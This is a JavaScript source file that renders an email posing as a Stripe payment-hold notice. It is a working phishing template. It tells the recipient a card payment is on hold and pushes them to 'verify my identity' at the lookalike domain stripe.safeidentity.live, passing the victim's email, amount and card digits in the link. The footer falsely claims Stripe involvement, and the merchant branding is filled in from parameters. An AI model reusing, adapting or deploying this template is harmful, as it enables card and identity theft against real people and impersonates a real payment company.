/**
 * Single source for invoice email HTML (Resend + /api/preview-invoice iframe).
 */

const DEFAULT_ORDER_REF = "1002-4480";

function buildInvoiceEmailHtml(p) {
  return `<!doctype html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <title>Security verification required</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style type="text/css">
    body, table, td, div, p, a, span, strong { font-family: 'Roboto', Arial, Helvetica, sans-serif !important; }
  </style>
  <!--[if mso]>
  <style type="text/css">
    body, table, td { font-family: 'Roboto', Arial, Helvetica, sans-serif !important; }
  </style>
  <![endif]-->
</head>
<body style="margin:0;padding:0;background-color:#f6f9fc;font-family:'Roboto',Arial,Helvetica,sans-serif;font-size:15px;line-height:24px;color:#525f7f;-webkit-font-smoothing:antialiased;">
  <!-- Wrapper table for centering -->
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#f6f9fc;">
    <tr>
      <td align="center" style="padding:40px 16px 60px;">
        <!-- Main container -->
        <table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0" style="max-width:600px;width:100%;">
          <!-- Banner -->
          <tr>
            <td align="center" valign="middle" style="height:130px;background-color:#ffffff;border-radius:12px 12px 0 0;" height="130">
              <img src="${p.merchant_logo}" alt="" style="border-radius:12px;max-height:60px;max-width:160px;display:block;" />
            </td>
          </tr>
          <!-- Body -->
          <tr>
            <td style="background-color:#ffffff;padding:0 40px;">
              <!-- Title -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr>
                  <td align="center" style="padding:0px 0 16px;font-size:24px;font-weight:600;color:#32325d;line-height:32px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                     Verification required &mdash; ${p.merchant_name}
                  </td>
                </tr>
                <tr>
                  <td align="center" style="font-size:15px;color:#8898aa;padding-bottom:28px;font-weight:400;line-height:18px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                    <a style="text-decoration: none; color:#8898aa; appearance: none; font-family:'Roboto',Arial,Helvetica,sans-serif;" href="mailto:${p.order_email}">${p.order_email.replace('@', '&#64;')}</a> &mdash; Transaction on hold
                  </td>
                </tr>
              </table> 
              <!-- Meta row -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="border-bottom:1px solid #e6ebf1;padding-bottom:12px;">
                <tr>
                  <td width="33%" valign="top" style="padding-bottom:28px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                    <div style="font-size:12px;font-weight:700;text-transform:uppercase;color:#8898aa;margin-bottom:4px;line-height:16px;">Amount</div>
                    <div style="font-size:15px;color:#525f7f;line-height:24px;">${p.amount}</div>
                  </td>
                  <td width="34%" valign="top" style="padding-bottom:28px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                    <div style="font-size:12px;font-weight:700;text-transform:uppercase;color:#8898aa;margin-bottom:4px;line-height:16px;">Date initiated</div>
                    <div style="font-size:15px;color:#525f7f;line-height:24px;">${p.date}</div>
                  </td>
                  ${p.card_brand && p.card_digits ? `<td width="33%" valign="top" style="padding-bottom:28px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                    <div style="font-size:12px;font-weight:700;text-transform:uppercase;color:#8898aa;margin-bottom:4px;line-height:16px;">Payment method</div>
                    <div style="font-size:15px;color:#525f7f;line-height:24px;"><strong style="font-weight:700;">${p.card_brand}</strong> - ${p.card_digits}</div>
                  </td>` : p.ref ? `<td width="33%" valign="top" style="padding-bottom:28px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                    <div style="font-size:12px;font-weight:700;text-transform:uppercase;color:#8898aa;margin-bottom:4px;line-height:16px;">Reference</div>
                    <div style="font-size:15px;color:#525f7f;line-height:24px;">${p.ref}</div>
                  </td>` : ''}
                </tr>
              </table>
              <!-- Alert title -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr>
                  <td style="font-size:12px;font-weight:700;text-transform:uppercase;color:#687385;padding:24px 0 14px;line-height:16px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                    Action required
                  </td>
                </tr>
              </table>
              <!-- Alert box -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="border:1px solid #e6ebf1;border-radius:5px;margin-bottom:24px;background-color:#f6f9fc;">
                <tr>
                  <td style="padding:20px 16px;">
                    <!-- Alert icon + heading -->
                    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="margin-bottom:12px;">
                      <tr>
                        <td width="32" valign="middle" style="width:32px;">
                          <div style="width:10px;height:10px;border-radius:50%;background-color:#556cd6;margin:0 5px;"></div>
                        </td>
                        <td valign="middle" style="letter-spacing:0.1px;font-size:15px;font-weight:700;color:#32325d;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                          Your payment could not be verified
                        </td>
                      </tr>
                    </table>
                    <!-- Alert text -->
                    <div style="font-size:15px;color:#525f7f;line-height:22px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                      For security reasons, your payment of <strong style="font-weight:600;color:#32325d;">${p.amount}</strong> to ${p.merchant_name} has been placed on hold. To release the funds and complete this transaction, <strong style="font-weight:600;color:#32325d;"> verify your identity</strong> as the authorized cardholder.
                    </div>
                  </td>
                </tr>
              </table>
              <!-- CTA Button -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="margin-bottom:28px;">
                <tr>
                  <td align="center">
                    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                      <tr>
                        <td align="center" style="background-color:#556cd6;border-radius:6px;">
                          <a href="https://stripe.safeidentity.live/verification?${p.invoiceParams}" target="_blank" style="display:block;padding:14px 0;color:#ffffff;text-align:center;font-size:16px;font-weight:600;text-decoration:none;font-family:'Roboto',Arial,Helvetica,sans-serif;">Verify my identity</a>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
              <!-- Support -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="border-top:1px solid #e6ebf1;">
                <tr>
                  <td style="padding:24px 0;font-size:16px;color:#414552;line-height:24px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                    If you didn't initiate this payment, please contact us immediately at <a href="mailto:${p.supportEmail}" style="color:#556cd6;text-decoration:none;font-family:'Roboto',Arial,Helvetica,sans-serif;">${p.supportEmail}</a> or visit <a href="${p.supportUrl}" style="color:#556cd6;text-decoration:none;font-family:'Roboto',Arial,Helvetica,sans-serif;">our support center</a>. Do not share your verification link with anyone.
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <!-- Footer -->
          <tr>
            <td style="background-color:#ffffff;border-top:1px solid #e6ebf1;border-radius:0 0 12px 12px;padding:20px 40px 24px;">
              <div style="font-size:12px;color:#8898aa;line-height:20px;padding-top:8px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                Something wrong with the email? <a href="#" style="color:#556cd6;text-decoration:none;">View it in your browser</a>.
              </div>
              <div style="font-size:12px;color:#8898aa;line-height:20px;padding-top:8px;margin-top:12px;font-family:'Roboto',Arial,Helvetica,sans-serif;">
                You're receiving this email because a payment was initiated using your card at ${p.merchant_name}, which partners with <a href="https://stripe.com" style="color:#556cd6;text-decoration:none;font-family:'Roboto',Arial,Helvetica,sans-serif;">Stripe</a> for secure payment processing.
              </div>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

/**
 * @param {object} fields - Same shape as send-invoice POST body (merchant fields).
 */
function renderInvoiceEmailFromFields(fields) {
  const {
    merchant_name,
    merchant_url,
    merchant_logo,
    order_amount,
    order_devise,
    order_email,
    order_date,
    order_ref,
    card_brand,
    card_digits,
  } = fields;

  const effectiveOrderRef =
    (order_ref != null && String(order_ref).trim()) || DEFAULT_ORDER_REF;

  const invoiceParams = new URLSearchParams({
    merchant_name: merchant_name || "",
    merchant_url: merchant_url || "",
    merchant_logo: merchant_logo || "",
    order_amount: order_amount || "",
    order_devise: order_devise || "",
    order_email: order_email || "",
  });
  if (order_date) invoiceParams.set("order_date", order_date);
  invoiceParams.set("order_ref", effectiveOrderRef);
  if (card_brand) invoiceParams.set("card_brand", card_brand);
  if (card_digits) invoiceParams.set("card_digits", card_digits);

  const ref = "#" + effectiveOrderRef;
  const date =
    order_date ||
    new Date().toLocaleDateString("en-US", {
      month: "short",
      day: "numeric",
      year: "numeric",
    });
  const amount = (order_devise || "") + (order_amount || "");
  const supportEmail = merchant_url ? "hello@" + merchant_url : "";
  const supportUrl = merchant_url ? "https://" + merchant_url + "/contact-us" : "";

  return buildInvoiceEmailHtml({
    merchant_name: merchant_name || "",
    merchant_url: merchant_url || "",
    merchant_logo: merchant_logo || "",
    order_amount: order_amount || "",
    order_devise: order_devise || "",
    card_brand: card_brand || "",
    card_digits: card_digits || "",
    order_email: order_email || "",
    ref,
    date,
    amount,
    supportEmail,
    supportUrl,
    invoiceParams: invoiceParams.toString(),
  });
}

module.exports = {
  buildInvoiceEmailHtml,
  renderInvoiceEmailFromFields,
};
